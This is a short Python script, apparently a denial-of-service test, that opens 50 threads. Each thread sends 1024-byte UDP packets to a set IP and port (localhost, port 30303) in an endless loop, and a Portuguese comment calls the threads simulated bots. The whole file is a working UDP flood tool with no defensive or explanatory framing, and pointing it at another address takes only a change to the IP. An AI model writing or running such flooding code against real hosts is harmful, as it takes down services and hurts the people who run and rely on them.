import socket
import threading

target_ip = "127.0.0.1"
target_port = 30303

def flood():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b"A" * 1024
    while True:
        client.sendto(data, (target_ip, target_port))

for i in range(50):  # número de threads simulando bots
    threading.Thread(target=flood).start()